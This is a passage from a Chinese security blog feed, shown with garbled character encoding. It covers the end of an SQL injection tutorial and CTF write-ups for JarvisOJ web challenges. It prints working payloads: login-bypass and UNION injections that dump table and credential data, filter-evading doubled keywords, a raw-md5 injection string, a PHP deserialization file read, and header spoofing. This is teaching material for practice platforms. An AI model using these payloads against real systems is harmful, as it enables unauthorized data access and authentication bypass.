ALLã€‚å¦å¤–ï¼ŒUNIONç»“æœé›†ä¸­çš„åˆ—åæ€»æ˜¯ç­‰äºUNIONä¸­ç¬¬ä¸€ä¸ªSELECTç»“æœçš„åˆ—åã€‚</p><h3 id="é€»è¾‘è¿ç®—"><a href="#é€»è¾‘è¿ç®—" class="headerlink" title="é€»è¾‘è¿ç®—"></a>é€»è¾‘è¿ç®—</h3><p>ä¸ºä»€ä¹ˆæˆ‘ä»¬ç§° <code>&#39; or 1=1#</code> ä¸ºä¸‡èƒ½å¯†ç ï¼Ÿ</p><p>æŸ¥è¯¢è¯­å¥æ˜¯<code>select * from admin where username = &#39;admin&#39; and passwd = &#39;&#39; or 1=1#&#39;</code> æ—¶æˆ‘ä»¬å¯ä»¥ä¸è¾“å…¥å¯†ç è¿›è¡Œç™»é™†è´¦æˆ·ï¼ŒåŸå› åœ¨äºwhere åé¢çš„ä¸‰ä¸ªæ¡ä»¶è¯­å¥<code>username = &#39;admin&#39;</code>  <code>and passwd=&#39;&#39;</code>  <code>or 1=1</code>ã€‚ä¸‰ä¸ªå­å¥ç”¨ and ã€ or è¿æ¥ï¼Œåœ¨sqlè¯­å¥ä¸­ and è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§é«˜äº or è¿ç®—ç¬¦ã€‚åœ¨è®¡ç®—æ—¶ç¬¬ä¸€ä¸ªå­å¥ä¸ºçœŸï¼Œç¬¬äºŒä¸ªä¸ºå‡ï¼ŒäºŒè€…andä»¥åä¸ºå‡ï¼Œè¿™ä¸ªå‡çš„ç»“æœå†ä¸ç¬¬ä¸‰ä¸ªor ï¼Œç»“æœä¸ºçœŸï¼Œæ‰€ä»¥è¿™æ•´å¥çš„ç»“æœå°±æ’çœŸäº†ã€‚</p><h2 id="UNION-è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#UNION-è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="UNION è”åˆæŸ¥è¯¢æ³¨å…¥"></a>UNION è”åˆæŸ¥è¯¢æ³¨å…¥</h2><p>å…³äºUNION çš„ç”¨æ³•è¯·å‚è€ƒç¬¬ä¸€èŠ‚ã€‚</p><p>ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥åˆ©ç”¨çš„å‰ææ˜¯é¡µé¢æœ‰å›æ˜¾ä½ã€‚</p><p>æ‰€è°“å›æ˜¾ä½æ˜¯æŒ‡åœ¨ä¸€ä¸ªç½‘ç«™çš„æ­£å¸¸é¡µé¢ï¼ŒæœåŠ¡ç«¯æ‰§è¡ŒSQLè¯­å¥æŸ¥è¯¢æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå®¢æˆ·ç«¯å°†æ•°æ®å±•ç°åœ¨é¡µé¢ä¸­ï¼Œè¿™ä¸ªå±•ç¤ºæ•°æ®çš„ä½ç½®å°±å«å›æ˜¾ä½ã€‚</p><p>è”åˆæŸ¥è¯¢çš„åŸºæœ¬æ­¥éª¤</p><ol><li>æ‰¾åˆ°æ³¨å…¥ç‚¹åˆ¤æ–­é—­åˆæ–¹å¼</li><li>åˆ¤æ–­æ•°æ®åº“ç±»å‹</li><li>åˆ¤æ–­æŸ¥è¯¢åˆ—æ•°</li><li>åˆ¤æ–­å›æ˜¾ä½</li><li>è·å–æ•°æ®åº“å</li><li>è·å–è¡¨å</li><li>è·å–å­—æ®µå</li><li>è·å–å­—æ®µä¸­çš„æ•°æ®</li></ol><p>ORDER BYå­å¥æ˜¯åŸºäºä¸€ä¸ªæˆ–å¤šä¸ªå­—æ®µæŒ‰ç…§å‡åºæˆ–é™åºå¯¹å…¶ä¸­çš„æ•°æ®è¿›è¡Œæ’åºã€‚ä¸€äº›æ•°æ®åº“é»˜è®¤çš„å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œå‡åºæ’åºï¼Œä¾‹å¦‚mysqlã€‚</p><p>æˆ‘ä»¬å¯ä»¥æŒ‡å®šå­—æ®µåè¿›è¡Œæ’åºã€‚è¿™é‡Œæˆ‘ä»¬æœ‰ä¸€å¼ è¡¨</p><pre><code>+----+----------+-----+-----------+----------+| ID | NAME     | AGE | ADDRESS   | SALARY   |+----+----------+-----+-----------+----------+|  1 | Ramesh   |  32 | Ahmedabad |  2000.00 ||  2 | Khilan   |  25 | Delhi     |  1500.00 ||  3 | kaushik  |  23 | Kota      |  2000.00 ||  4 | Chaitali |  25 | Mumbai    |  6500.00 ||  5 | Hardik   |  27 | Bhopal    |  8500.00 ||  6 | Komal    |  22 | MP        |  4500.00 ||  7 | Muffy    |  24 | Indore    | 10000.00 |+----+----------+-----+-----------+----------+</code></pre><p>æŸ¥è¯¢è¯­å¥ä¾‹å¦‚ </p><pre><code>SELECT * FROM CUSTOMERS   ORDER BY NAME, SALARY;</code></pre><p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹</p><pre><code>+----+----------+-----+-----------+----------+| ID | NAME     | AGE | ADDRESS   | SALARY   |+----+----------+-----+-----------+----------+|  4 | Chaitali |  25 | Mumbai    |  6500.00 ||  5 | Hardik   |  27 | Bhopal    |  8500.00 ||  3 | kaushik  |  23 | Kota      |  2000.00 ||  2 | Khilan   |  25 | Delhi     |  1500.00 ||  6 | Komal    |  22 | MP        |  4500.00 ||  7 | Muffy    |  24 | Indore    | 10000.00 ||  1 | Ramesh   |  32 | Ahmedabad |  2000.00 |+----+----------+-----+-----------+----------+</code></pre><p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‡å®šå­—æ®µçš„æ ä½è¿›è¡Œæ’åºï¼Œç¬¬ä¸€ä¸ªå­—æ®µä¸º1ï¼Œç¬¬äºŒä¸ªä¸º2ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬æœ‰ä¸€å¼ è¡¨</p><pre><code>+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb        ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy      ||  5 | stupid   | stupidity  ||  6 | superman | genious     ||  7 | batman   | mob!le      ||  8 | admin    | admin       ||  9 | admin1   | admin1      || 10 | admin2   | admin2      || 11 | admin3   | admin3      || 12 | dhakkan  | dumbo       || 14 | admin4   | admin4      || 15 | admin#   | 789          |+----+----------+------------+</code></pre><p>æˆ‘ä»¬ä½¿ç”¨æ ä½è¿›è¡ŒæŸ¥è¯¢</p><pre><code>select * from users order by 3;</code></pre><p>æŸ¥è¯¢ç»“æœæŒ‰ç…§ç¬¬ä¸‰æ è¿›è¡Œæ’åº</p><pre><code>+----+----------+------------+| id | username | password   |+----+----------+------------+| 15 | admin#   | 789         ||  8 | admin    | admin       ||  9 | admin1   | admin1      || 10 | admin2   | admin2      || 11 | admin3   | admin3      || 14 | admin4   | admin4      ||  4 | secure   | crappy      ||  1 | Dumb     | Dumb        || 12 | dhakkan  | dumbo       ||  6 | superman | genious     ||  2 | Angelina | I-kill-you ||  7 | batman   | mob!le      ||  3 | Dummy    | p@ssword   ||  5 | stupid   | stupidity  |+----+----------+------------+</code></pre><p>å¦‚æœæˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„æ ä½å‘¢ï¼Ÿ</p><pre><code>select * from users order by 4;</code></pre><p>æ•°æ®åº“å°†ä¼šæŠ¥é”™</p><pre><code>ERROR 1054 (42S22): Unknown column &apos;4&apos; in &apos;order clause&apos;</code></pre><p>åŸºäºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨äºŒåˆ†æ³•æ¥å¯¹åˆ—æ•°è¿›è¡ŒçŒœè§£ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨UNIONæ¥åˆ¤æ–­å›æ˜¾ä½ï¼ŒUNIONçš„ä½œç”¨æ˜¯å°†ä¸¤ä¸ªselectæŸ¥è¯¢ç»“æœåˆå¹¶</p><pre><code>select id,username from users where id=4 union select 1,2;</code></pre><p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹</p><pre><code>+----+----------+| id | username |+----+----------+|  4 | secure   ||  1 | 2          |+----+----------+</code></pre><p>åœ¨å±•ç¤ºæ•°æ®çš„æ—¶å€™é€šå¸¸æŒ‡å–ç»“æœé›†çš„ç¬¬ä¸€è¡Œæ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å–å‡ºååŠéƒ¨åˆ†çš„ç»“æœï¼Œå°±è¦ä½¿åŸæ¥çš„æŸ¥è¯¢æŸ¥ä¸å‡ºç»“æœ</p><pre><code>select id,username from users where id=-4 union select 1,2;</code></pre><p>é€šè¿‡æŸ¥è¯¢è´Ÿæ•°ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬å…ˆè¦çš„æ•°æ®äº†</p><pre><code>+----+----------+| id | username |+----+----------+|  1 | 2        |+----+----------+</code></pre><p>å¾—åˆ°å›æ˜¾ä½ä¹‹åï¼Œè·å–æ•°æ®åº“åå°±åœ¨å›æ˜¾ä½ä½¿ç”¨database()å‡½æ•°</p><pre><code>select id,username from users where id=-4 union select 1,database();</code></pre><p>æ¥ä¸‹æ¥æŸ¥è¯¢åº“ä¸­æ‰€æœ‰è¡¨åï¼Œä»ç„¶æ˜¯åœ¨å›æ˜¾ä½è¿›è¡ŒæŸ¥è¯¢</p><pre><code>select id,username from users where id=-4 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();</code></pre><p>ç„¶åæ˜¯è¡¨ä¸­çš„åˆ—å</p><pre><code>select id,username from users where id=-4 union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;;</code></pre><p>æœ€åæ˜¯æ•°æ®</p><pre><code>select id,username from users where id=-4 union select 1,username from users;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ WP</title>
      <link href="/2019/08/01/JarvisOJ/"/>
      <url>/2019/08/01/JarvisOJ/</url>
      
        <content type="html"><![CDATA[<p>çœŸæ˜¯è¢«è‡ªå·±èœå“­äº†ï¼Œæš‘å‡ç¬¬ä¸€ä¸ªæœˆä¸€å®šè¦æŠŠWEBåˆ·å®Œå†™å®ŒWPï¼</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>æœ‰æ—¶é—´ä¹Ÿåšåšåˆ«çš„</p><h3 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.jarvisoj.com:32770/" title="é¢˜ç›®é“¾æ¥" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p><p>è¦ç”¨æœ¬åœ°51ç«¯å£å»è®¿é—®</p><pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></pre><p>ä½†æ˜¯åº”è¯¥æ˜¯é¢˜ç›®é—®é¢˜ï¼Œæ²¡æ˜¾ç¤ºå‡ºæ¥flagã€‚</p><h3 id="Localhost"><a href="#Localhost" class="headerlink" title="Localhost"></a>Localhost</h3><p>é¢˜ç›®é“¾æ¥ <a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a></p><p>é¢˜ç›®è¦æ±‚localhost only,æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ªé€ X-FORWARDED-FORæ¥è¾¾åˆ°ç›®çš„</p><pre><code>import requestsurl=&apos;http://web.jarvisoj.com:32774/&apos;s=requests.session()data={&apos;X-FORWARDED-FOR&apos;:&apos;127.0.0.1&apos;}r=s.get(url,headers=data)print(r.text)</code></pre><p>è¿”å›ä¿¡æ¯åŒ…å«flag</p><h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>è¿™é‡Œå†ç¨ç¨è¡¥å……ä¸€ä¸‹HTTPåè®®è¯·æ±‚å¤´çš„çŸ¥è¯†</p><ol><li>æ¯ä¸ªHTTPè¯·æ±‚çš„ç¬¬ä¸€è¡Œéƒ½ç”±3ä¸ªä»¥ç©ºæ ¼é—´éš”çš„é¡¹ç›®ç»„æˆ</li><li>ä¸€ä¸ªè¯´æ˜HTTPæ–¹æ³•çš„åŠ¨è¯ï¼Œä¸»è¦ä½œç”¨æ˜¯ä»WebæœåŠ¡å™¨è·å–ä¸€ä¸ªèµ„æºï¼ŒGETè¯·æ±‚å¹¶æ²¡æœ‰æ¶ˆæ¯ä¸»é¢˜ï¼Œå› æ­¤æ¶ˆæ¯å¤´åçš„ç©ºç™½è¡Œä¸­æ²¡æœ‰å…¶ä»–æ•°æ®ã€‚</li><li>ç¬¬äºŒä¸ªæ˜¯è¯·æ±‚çš„URLï¼Œé€šå¸¸ç”±ä¸€ä¸ªæ‰€è¯·æ±‚çš„èµ„æºåç§°ä»¥åŠå®¢æˆ·ç«¯å‘è¯¥èµ„æºæäº¤çš„å‚æ•°çš„å¯é€‰æŸ¥è¯¢å­—ç¬¦ä¸²ç»„æˆ</li><li>ç¬¬ä¸‰ä¸ªæ˜¯ä½¿ç”¨çš„HTTPç‰ˆæœ¬ï¼Œå¸¸ç”¨HTTPç‰ˆæœ¬ä¸º1.1å’Œ1.0ï¼Œæˆ‘ä»¬é‡åˆ°çš„å”¯ä¸€å·®å¼‚å¯èƒ½å°±æ˜¯1.1ç‰ˆæœ¬å¿…é¡»ä½¿ç”¨Hostè¯·æ±‚</li><li>Refereræ¶ˆæ¯å¤´è¡¨ç¤ºç”¨äºå‘å‡ºè¯·æ±‚çš„åŸå§‹URL</li><li>User-Agentæ¶ˆæ¯å¤´æä¾›ä¸æµè§ˆå™¨æˆ–å…¶ä»–ç”Ÿæˆè¯·æ±‚çš„å®¢æˆ·ç«¯è½¯ä»¶æœ‰å…³çš„ä¿¡æ¯</li><li>Hostæ¶ˆæ¯å¤´ç”¨äºæŒ‡å®šå‡ºç°åœ¨è¢«è®¿é—®çš„å®Œæ•´URLä¸­çš„ä¸»æœºåç§°ï¼Œå¦‚æœå‡ ä¸ªWEBç«™ç‚¹ä»¥ç›¸åŒçš„ä¸€å°æœåŠ¡å™¨ä¸ºä¸»æœºå°±éœ€è¦æŒ‡å®šHOSTï¼Œå› ä¸ºç¬¬ä¸€è¡Œä¸­çš„URLé€šå¸¸ä¸åŒ…å«ä¸»æœºåç§°ã€‚æœåŠ¡å™¨å¯ä»¥é€šè¿‡è¯¥å­—æ®µè¿›è¡ŒIPè¿‡æ»¤æ“ä½œã€‚</li><li>X-FORWARDED-FORå½“ä½ ä½¿ç”¨äº†ä»£ç†æ—¶webæœåŠ¡å™¨å°±ä¸çŸ¥é“ä½ çš„çœŸå®IPäº†ï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µä»£ç†æœåŠ¡å™¨ä¼šå¢åŠ ä¸€ä¸ªè¯¥å­—æ®µä¿¡æ¯ï¼ŒæŠŠé“¾æ¥ä»–çš„å®¢æˆ·ç«¯IPåŠ åˆ°è¿™ä¸ªæ¶ˆæ¯å¤´é‡Œï¼Œä¿è¯æœåŠ¡å™¨èƒ½è·å–åˆ°çœŸå®IPã€‚è¿™æ˜¯ä¸€ä¸ªæ‰©å±•å¤´ã€‚</li><li>cookieä¸ºæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„å­˜äºå®¢æˆ·ç«¯çš„èº«ä»½æ ‡è¯†</li></ol><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªå¯†ç çš„æäº¤æ¡†ï¼Œéšä¾¿æµ‹ä¸€ä¸‹æ²¡ä»€ä¹ˆæ”¶è·ï¼ŒæŸ¥çœ‹è¯·æ±‚ä¿¡æ¯å‘ç°HINTåœ¨å“åº”å¤´é‡Œ</p><pre><code>&quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</code></pre><p>è¿™é‡Œå°†md5åçš„å¯†ç æäº¤æŸ¥è¯¢ï¼Œæ³¨æ„åˆ°md5çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrue</p><pre><code>string md5( string $str[, bool $raw_output = false] )</code></pre><p><strong>raw_output<br>å¦‚æœå¯é€‰çš„ raw_output è¢«è®¾ç½®ä¸º TRUEï¼Œé‚£ä¹ˆ MD5 æŠ¥æ–‡æ‘˜è¦å°†ä»¥16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚</strong></p><p>æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²åœ¨md5ä¹‹åå«æœ‰ <code>&#39; or &#39;</code> ä¹‹ç±»çš„å¯ä»¥äº§ç”Ÿé—­åˆçš„ã€‚</p><p>å›½å¤–çš„å¤§ä½¬åœ¨2010å¹´è·‘å‡ºæ¥äº†å‡ ä¸ªç¬¦åˆæ¡ä»¶çš„<a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" title="è¿™æ˜¯é‚£ç¯‡åšå®¢" target="_blank" rel="noopener">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p><p>æˆ‘ä»¬å¯ä»¥ç”¨ä¸¤ä¸ª </p><pre><code>129581926211651571912466741651878684928ffifdyop</code></pre><h3 id="ç¥ç›¾å±€çš„ç§˜å¯†"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯†"></a>ç¥ç›¾å±€çš„ç§˜å¯†</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p><p>è¿›å…¥é¢˜ç›®åæŸ¥çœ‹æºç å‘ç°ba64åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œ</p><p><code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</code></p><p>å°è¯•ç¼–ç index.phpè¯»æºç </p><pre><code>&lt;?php     require_once(&apos;shield.php&apos;);    $x = new Shield();    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];    if (!empty($g)) {        $x = unserialize($g);    }    echo $x-&gt;readfile();?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°åŒ…å«äº†shield.phpï¼Œå†è¯»shield.php</p><pre><code>&lt;?php    //flag is in pctf.php    class Shield {        public $file;        function __construct($filename = &apos;&apos;) {            $this -&gt; file = $filename;        }        function readfile() {            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE              &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {                return @file_get_contents($this-&gt;file);            }        }    }?&gt;</code></pre><p>ç®€å•çš„åºåˆ—åŒ–ï¼Œæ§åˆ¶fileå˜é‡</p><pre><code>&lt;?php    //flag is in pctf.phpclass Shield {    public $file;    function __construct($filename = &apos;&apos;) {        $this -&gt; file = $filename;    }    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}$example = new Shield();$example-&gt;file = &quot;pctf.php&quot;;echo serialize($example);?&gt;</code></pre><h3 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p><p>æŸ¥çœ‹æºç å‘ç°hintï¼Œè¿›è€Œè¯»å–æºç </p><pre><code>&lt;?phperror_reporting(0);echo &quot;&lt;!--index.phps--&gt;&quot;;if(!$_GET[&apos;id&apos;]){    header(&apos;Location: index.php?id=1&apos;);    exit();}$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;)){    echo &apos;Hahahahahaha&apos;;    return ;}$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4){    require(&quot;flag.txt&quot;);}else{    print &quot;work harder!harder!harder!&quot;;}?&gt;</code></pre><p>ç®€å•åˆ†æä¹‹åæˆ‘ä»¬éœ€è¦æ³¨æ„å‡ ä¸ªç‚¹</p><ol><li>stripos()å­—ç¬¦ä¸²æˆªå–å‡½æ•°ï¼Œä¸strposä¸åŒå‰è€…ä¸åŒºåˆ†å¤§å°å†™ã€‚</li><li>phpä¸­ <code>0admin == 0</code> ,åœ¨æ¯”è¾ƒæ—¶ä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•´å‹å†æ¯”è¾ƒã€‚</li><li>file_get_contents() å‡½æ•°æ˜¯ç”¨æ¥å°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ï¼ŒNote: å¦‚æœè¦æ‰“å¼€æœ‰ç‰¹æ®Šå­—ç¬¦çš„ URL ï¼ˆæ¯”å¦‚è¯´æœ‰ç©ºæ ¼ï¼‰ï¼Œå°±éœ€è¦ä½¿ç”¨ urlencode() è¿›è¡Œ URL ç¼–ç ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ”¾ä¸€ä¸ªæ–‡ä»¶ç„¶åä¼ ipåœ°å€ï¼Œå¦‚æœè¿™æ ·åšçš„è¯æˆ‘ä»¬è¿˜è¦é¿å… <code>.</code>,æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†ç‚¹åˆ†åè¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ã€‚è½¬æ¢å™¨ï¼š<a href="https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef" title="åœ°å€è½¬æ¢" target="_blank" rel="noopener">https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef</a>ã€‚åŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¼ªåè®®ï¼š<code>php://input</code> æ¥Postä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</li><li>eregi()ä¸åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é….è¿™é‡Œæˆ‘ä»¬é€šè¿‡%00æˆªæ–­æ¥ç»•è¿‡eregiçš„æ£€æµ‹ã€‚</li><li>%00åœ¨strlençš„åˆ¤æ–­ä¸­ä»å 3ä¸ªå­—ç¬¦ã€‚</li></ol><p>æˆ‘ä»¬è¿›è¡Œæ„é€ </p><pre><code>http://web.jarvisoj.com:32780/index.php?id=0admin&amp;a=php://input&amp;b=%00admin</code></pre><p>å¾—åˆ°</p><p>ï»¿<code>Come ON!!! {/^HT2mCpcvOLf}</code></p><p>è¿›è¡Œè®¿é—®å¾—åˆ°</p><pre><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1</code></pre><p>ç°åœ¨å¼€å§‹è¿™æ˜¯ä¸€é“æ³¨å…¥é¢˜äº†</p><p>æµ‹è¯•id=2,è¿”å›</p><pre><code>SELECT * FROM content WHERE id=2</code></pre><p>id=1â€™</p><pre><code>SELECT * FROM content WHERE id=1&apos;</code></pre><p>id=1 and 1=1 #</p><pre><code>you bad boy/girl!</code></pre><p>æµ‹è¯•å‘ç°æˆ‘ä»¬ä¸éœ€è¦é—­åˆå•å¼•å·ä¸æ³¨é‡Šï¼ŒåŒæ—¶è¿‡æ»¤äº†ç©ºæ ¼ã€‚å¯¹äºç©ºæ ¼é¦–å…ˆå°è¯•/**/ï¼Œå‘ç°ä¸è¡Œï¼Œé‚£ä¹ˆ/*a*/å‘¢ï¼Ÿ</p><pre><code>?id=1/*a*/and/*a*/1=1 hi666</code></pre><p>è¿™æ ·å¯ä»¥ã€‚ç„¶åçŒœæµ‹å­—æ®µä¸ªæ•°</p><pre><code>?id=1/*a*/order/*a*/by/*a*/3</code></pre><p>çœ‹å›æ˜¾ä½ï¼Œè¿™é‡Œunion,select éƒ½è¢«è¿‡æ»¤ï¼ŒåŒå†™ç»•è¿‡</p><pre><code>?id=-1/*a*/ununionion/*a*/selselectect/*a*/1,2,3</code></pre><p>çœ‹æ•°æ®åº“</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),database()</code></pre><p>çœ‹è¡¨ï¼Œè¿™é‡ŒfromåŒæ ·åŒå†™</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(table_name)/*a*/frfromom/*a*/information_schema.tables/*a*/where/*a*/table_schema=database()</code></pre><p>çœ‹å­—æ®µï¼Œä¸èƒ½ç›´æ¥ä¼ è¡¨åï¼Œéœ€è¦16è¿›åˆ¶ç¼–ç ä¸€ä¸‹</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(column_name)/*a*/frfromom/*a*/information_schema.columns/*a*/where/*a*/table_name=0x636f6e74656e74</code></pre><p>çœ‹ä¿¡æ¯å¾—åˆ°flag</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),context/*a*/frofromm/*a*/content    </code></pre><h3 id="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"><a href="#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ" class="headerlink" title="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"></a>flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p><p>æ‹¿åˆ°é¢˜ç›®çœ‹åˆ° <strong>Only Admin can see the flag!!</strong></p><p>å…ˆçœ‹çœ‹å“åº”å¤´ä¿¡æ¯ï¼Œå°è¯•æ”¹ä¸€ä¸‹cookieä¸ºadminï¼Œæœç„¶æ²¡è¿™ä¹ˆç®€å•ã€‚</p><p>æ‹¿æ‰«æå™¨æ‰«ä¸€ä¸‹æ‰«åˆ°äº†<code>index.php~</code>,çœ‹ä¸€ä¸‹16è¿›åˆ¶æ•°æ®å‘ç°æ˜¯vimäº§ç”Ÿçš„æ–‡ä»¶ï¼Œå…ˆæ”¹ä¸€ä¸‹åç¼€ä¸º<code>index.php.swp</code>ç”¨<code>vim -r index.php</code> æ¢å¤ä¸€ä¸‹å¾—åˆ°æºç .</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;    body {        background:gray;        text-align:center;    }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php         $auth = false;        $role = &quot;guest&quot;;        $salt =         if (isset($_COOKIE[&quot;role&quot;])) {            $role = unserialize($_COOKIE[&quot;role&quot;]);            $hsh = $_COOKIE[&quot;hsh&quot;];            if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) {                $auth = true;            } else {                $auth = false;            }        } else {            $s = serialize($role);            setcookie(&apos;role&apos;,$s);            $hsh = md5($salt.strrev($s));            setcookie(&apos;hsh&apos;,$hsh);        }        if ($auth) {            echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot;        } else {            echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;        }    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>é‡ç‚¹æ˜¯ <code>if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;])))</code></p><p>HASHé•¿åº¦æ‰©å±•æ”»å‡»æ²¡é”™äº†ã€‚</p><h4 id="Hash-Length-Extension-Attacks"><a href="#Hash-Length-Extension-Attacks" class="headerlink" title="Hash Length Extension Attacks"></a>Hash Length Extension Attacks</h4><p><strong>åŸç†</strong></p><blockquote><p>æœåŠ¡å™¨å°†sercet å’Œ message è¿æ¥åœ¨ä¸€èµ·ï¼Œç„¶åç”¨æ‘˜è¦ç®—æ³•å–æ‘˜è¦ï¼Œç ”ç©¶å‘ç°MD4ã€MD5ã€RIPEMD-160ã€SHA-0ã€SHA-1ã€SHA-256ã€SHA-512ã€WHIRLPOOLç­‰æ‘˜è¦ç®—æ³•å—æ­¤æ”»å‡»ï¼Œä½†MD2ã€SHA-224å’ŒSHA-384ä¸å—æ­¤æ”»å‡»ã€‚</p><p>å“ˆå¸Œæ‘˜è¦ç®—æ³•ï¼Œå¦‚MD5ã€SHA1ã€SHA2ç­‰ï¼Œéƒ½æ˜¯åŸºäºMerkleâ€“DamgÃ¥rdç»“æ„ã€‚è¿™ç±»ç®—æ³•æœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼šå½“çŸ¥é“hash(secret + 